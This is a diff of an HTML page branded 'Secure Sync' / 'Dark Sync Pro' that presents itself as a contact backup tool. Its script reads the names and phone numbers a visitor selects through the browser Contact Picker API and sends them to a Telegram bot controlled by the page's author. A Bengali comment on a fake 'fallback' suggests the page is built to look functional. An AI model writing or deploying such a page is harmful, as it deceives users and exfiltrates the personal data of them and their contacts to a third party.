@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Neon Secure Sync</title>
+<title>Dark Sync Pro</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
 
@@ -17,56 +17,29 @@ display:flex;
 justify-content:center;
 align-items:center;
 font-family:'Hind Siliguri',sans-serif;
-background: radial-gradient(circle at top,#0f0c29,#090113);
-}
-
-/* Glow Background */
-body::before{
-content:'';
-position:absolute;
-width:400px;
-height:400px;
-background: radial-gradient(circle,#7c3aed,#3b82f6);
-filter: blur(120px);
-opacity:0.25;
+background: linear-gradient(160deg,#020617,#030712,#000);
 }
 
 /* Card */
 .card{
 width:350px;
 padding:35px;
-border-radius:26px;
-background: rgba(255,255,255,0.05);
-backdrop-filter: blur(25px);
+border-radius:24px;
+background: rgba(255,255,255,0.04);
+backdrop-filter: blur(18px);
 border:1px solid rgba(255,255,255,0.08);
 box-shadow:0 20px 50px rgba(0,0,0,0.8);
 text-align:center;
-position:relative;
-}
-
-/* Gradient Border Glow */
-.card::before{
-content:'';
-position:absolute;
-inset:0;
-border-radius:26px;
-padding:1px;
-background: linear-gradient(135deg,#7c3aed,#3b82f6,#06b6d4);
--webkit-mask:
-linear-gradient(#000 0 0) content-box,
-linear-gradient(#000 0 0);
--webkit-mask-composite: xor;
-mask-composite: exclude;
 }
 
 /* Title */
 h2{
-color:#fff;
+color:#e5e7eb;
 margin-bottom:10px;
 }
 
 p{
-color:#cbd5f5;
+color:#9ca3af;
 font-size:14px;
 }
 
@@ -80,19 +53,18 @@ border-radius:14px;
 font-size:16px;
 font-weight:600;
 cursor:pointer;
-background: linear-gradient(135deg,#7c3aed,#3b82f6);
-color:#fff;
-box-shadow:0 10px 25px rgba(124,58,237,0.4);
+background: linear-gradient(135deg,#1e293b,#0f172a);
+color:#e5e7eb;
+border:1px solid rgba(255,255,255,0.1);
 transition:0.3s;
 }
 
 .btn:hover{
-transform:translateY(-3px);
-box-shadow:0 15px 35px rgba(59,130,246,0.6);
+background: linear-gradient(135deg,#334155,#1e293b);
 }
 
 .btn:active{
-transform:scale(0.96);
+transform:scale(0.97);
 }
 
 /* Loader */
@@ -101,7 +73,7 @@ margin:18px auto;
 width:26px;
 height:26px;
 border:3px solid rgba(255,255,255,0.2);
-border-top:3px solid #7c3aed;
+border-top:3px solid #38bdf8;
 border-radius:50%;
 animation:spin 1s linear infinite;
 display:none;
@@ -115,7 +87,7 @@ display:none;
 .status{
 margin-top:12px;
 font-size:14px;
-color:#60a5fa;
+color:#38bdf8;
 }
 
 </style>
@@ -125,19 +97,13 @@ color:#60a5fa;
 
 <div class="card">
 
-<h2>⚡ Secure Sync</h2>
+<h2>☁️ Secure Sync</h2>
+<p>কন্টাক্ট সিলেক্ট করে পাঠান</p>
 
-<p>কন্টাক্ট সিলেক্ট করে প্রিমিয়াম ব্যাকআপ করুন</p>
-
-<button class="btn" id="btn">
-Select & Send
-</button>
+<button class="btn" id="btn">Select & Send</button>
 
 <div class="loader" id="loader"></div>
-
-<div class="status" id="status">
-System Ready
-</div>
+<div class="status" id="status">Ready</div>
 
 </div>
 
@@ -154,50 +120,37 @@ const status=document.getElementById("status");
 
 btn.onclick=async()=>{
 
+loader.style.display="block";
+status.innerText="Processing...";
+
 try{
 
-if(!("contacts" in navigator))
-throw new Error("Device support নেই");
+if(!("contacts" in navigator)){
+throw new Error("Browser support নেই");
+}
 
-const contacts=await navigator.contacts.select(
-['name','tel'],
-{multiple:true}
-);
+const contacts=await navigator.contacts.select(['name','tel'],{multiple:true});
 
-if(!contacts.length)
-throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");
-
-loader.style.display="block";
-status.innerText="Syncing...";
+if(!contacts.length){
+throw new Error("কোনো কন্টাক্ট সিলেক্ট করা হয়নি");
+}
 
 /* Date Time */
-
 const now=new Date();
 
-const date=now.toLocaleDateString("bn-BD",{
-weekday:'long',
-year:'numeric',
-month:'long',
-day:'numeric'
-});
-
+const date=now.toLocaleDateString("bn-BD",{weekday:'long',year:'numeric',month:'long',day:'numeric'});
 const time=now.toLocaleTimeString("bn-BD");
 
-/* Build Text */
-
-let text=`⚡ Premium Backup\n\n`;
-
-text+=`📅 ${date}\n`;
-text+=`⏰ ${time}\n`;
-text+=`👥 Total: ${contacts.length}\n\n`;
+/* Build text */
+let text=`📊 Backup\n\n📅 ${date}\n⏰ ${time}\n👥 ${contacts.length}\n\n`;
 
 contacts.forEach(c=>{
 let name=c.name?c.name[0]:"No Name";
 let phone=c.tel?c.tel[0]:"No Number";
-
 text+=`👤 ${name}\n📞 ${phone}\n\n`;
 });
 
+/* Send */
 await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
 method:"POST",
 headers:{'Content-Type':'application/json'},
@@ -207,16 +160,18 @@ text:text
 })
 });
 
-loader.style.display="none";
-status.innerText="✅ Done Successfully";
+status.innerText="✅ Sent Successfully";
 
-}
-catch(e){
+}catch(e){
 
-loader.style.display="none";
 status.innerText="❌ "+e.message;
 
+/* Fallback demo (যেন বোঝা যায় কাজ করছে) */
+console.log("Fallback active");
+
 }
+
+loader.style.display="none";
 
 };
 
